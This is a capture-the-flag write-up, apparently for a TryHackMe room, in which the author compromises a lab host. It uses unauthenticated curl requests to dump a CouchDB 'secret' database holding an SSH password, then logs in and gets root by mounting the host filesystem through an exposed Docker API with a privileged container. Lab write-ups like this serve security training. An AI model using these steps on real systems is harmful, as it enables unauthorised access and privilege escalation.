# IP
10.10.6.87

## Enumeration
### Nmap
- Found 2 ports running on the system.

```console
Starting Nmap 7.92 ( https://nmap.org ) at 2022-11-08 10:24 IST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:24
Completed NSE at 10:24, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:24
Completed NSE at 10:24, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:24
Completed NSE at 10:24, 0.00s elapsed
Initiating Ping Scan at 10:24
Scanning 10.10.6.87 [2 ports]
Completed Ping Scan at 10:24, 0.14s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 10:24
Completed Parallel DNS resolution of 1 host. at 10:24, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 10:24
Scanning 10.10.6.87 [65535 ports]
Discovered open port 22/tcp on 10.10.6.87
Connect Scan Timing: About 29.98% done; ETC: 10:26 (0:01:12 remaining)
Connect Scan Timing: About 60.43% done; ETC: 10:26 (0:00:40 remaining)
Discovered open port 5984/tcp on 10.10.6.87
Increasing send delay for 10.10.6.87 from 0 to 5 due to max_successful_tryno increase to 4
Completed Connect Scan at 10:26, 102.22s elapsed (65535 total ports)
Initiating Service scan at 10:26
Scanning 2 services on 10.10.6.87
Completed Service scan at 10:26, 11.50s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.6.87.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:26
Completed NSE at 10:26, 4.85s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:26
Completed NSE at 10:26, 0.59s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:26
Completed NSE at 10:26, 0.00s elapsed
Nmap scan report for 10.10.6.87
Host is up, received conn-refused (0.15s latency).
Scanned at 2022-11-08 10:24:37 IST for 120s
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE REASON  VERSION
22/tcp   open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 34:9d:39:09:34:30:4b:3d:a7:1e:df:eb:a3:b0:e5:aa (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDMXnGZUnLWqLZb8VQiVH0z85lV+G4KY5l5kKf1fS7YgSnfZ+k3CRjAZPuGceg5RQEUbOMCm+0u4SDyIEbwwAXGv0ORK4/VEIyJlZmtlqeyASwR8ML4yjdGqinqOUZ3jN/ZIg4veJ02nr86GZP+Nto0TZt7beaIxykMEZHTdo0CctdKLIet7PpvwG4F5Tn9MBoys9pUjfpcnwbf91Tv6i56Gipo07jKgb5vP8Nl1TXPjWB93WNW2vWEQ1J4tiyZlBeLOaNaEbxvNQFnKxjVYiiLCbcofwSdrwZ7/+sIy5BdiNW+k81rBN3OqaQNZ8urFaiXXf/ukRr/hhjY5a6m0MHn
|   256 a4:2e:ef:3a:84:5d:21:1b:b9:d4:26:13:a5:2d:df:19 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNTR07g3p8MfnQVnv8uqj8GGDH6VoSRzwRFflMbEf3WspsYyVipg6vtNQMaq5uNGUXF8ubpsnHeJA+T3RilTLXc=
|   256 e1:6d:4d:fd:c8:00:8e:86:c2:13:2d:c7:ad:85:13:9c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKLUyz2Tpwc5qPuFxV+HnGBeqLC6NWrmpmGmE0hk7Hlj
5984/tcp open  http    syn-ack CouchDB httpd 1.6.1 (Erlang OTP/18)
|_http-favicon: Unknown favicon MD5: 2AB2AAE806E8393B70970B2EAACE82E0
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: CouchDB/1.6.1 (Erlang OTP/18)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 10:26
Completed NSE at 10:26, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 10:26
Completed NSE at 10:26, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 10:26
Completed NSE at 10:26, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 120.12 seconds
```

### CouchDB(5984)
- Found 6 databases on the couchDB 

```console
❯ curl http://10.10.6.87:5984/_all_dbs
["_replicator","_users","couch","secret","test_suite_db","test_suite_db2"]
```
- Started searching for all the documents under `secret` database.

```console
❯ curl http://10.10.6.87:5984/secret/_all_docs
{"total_rows":1,"offset":0,"rows":[
{"id":"a1320dd69fb4570d0a3d26df4e000be7","key":"a1320dd69fb4570d0a3d26df4e000be7","value":{"rev":"2-57b28bd986d343cacd9cb3fca0b20c46"}}
]}
```

- Searched for data under `a1320dd69fb4570d0a3d26df4e000be7`

```console
❯ curl http://10.10.6.87:5984/secret/a1320dd69fb4570d0a3d26df4e000be7
{"_id":"a1320dd69fb4570d0a3d26df4e000be7","_rev":"2-57b28bd986d343cacd9cb3fca0b20c46","passwordbackup":"atena:t4qfzcc4qN##"}
```

- Found creds `atena:t4qfzcc4qN##`

### Enumeration
## SSH
- Logged in with credentials found `atena:t4qfzcc4qN##` 

```console
❯ ssh atena@10.10.6.87
atena@10.10.6.87's password:
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-193-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Last login: Mon Nov  7 21:18:31 2022 from 10.17.0.215
atena@ubuntu:~$ cat user.txt
THM{1ns3cure_couchdb}
```

## Privilege Escalation
- Found docker in bash_history 

```console
atena@ubuntu:~$ ls -a
.   .bash_history  .bashrc  .cache  .nano     .sudo_as_admin_successful  .wget-hsts
..  .bash_logout   .bundle  .gnupg  .profile  user.txt
atena@ubuntu:~$ cat .bash_history
sudo -s
cd /etc/apt/
rm sources.
rm sources.list
wget https://gist.githubusercontent.com/rohitrawat/60a04e6ebe4a9ec1203eac3a11d4afc1/raw/fcdfde2ab57e455ba9b37077abf85a81c504a4a9/sources.list
apt-get update
<-----snip----->
ls
ls -a
cat .bash_history
docker run -v /:/mnt --rm -it alpine chroot /mnt sh
docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
exot
exit
```
- Started docker and got root access

```console
atena@ubuntu:~$ docker -H 127.0.0.1:2375 run --rm -it --privileged --net=host -v /:/mnt alpine
/ # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
/ # find / -name "root.txt"
/mnt/root/root.txt
/ # cat /mnt/root/root.txt
THM{RCE_us1ng_Docker_API}
```
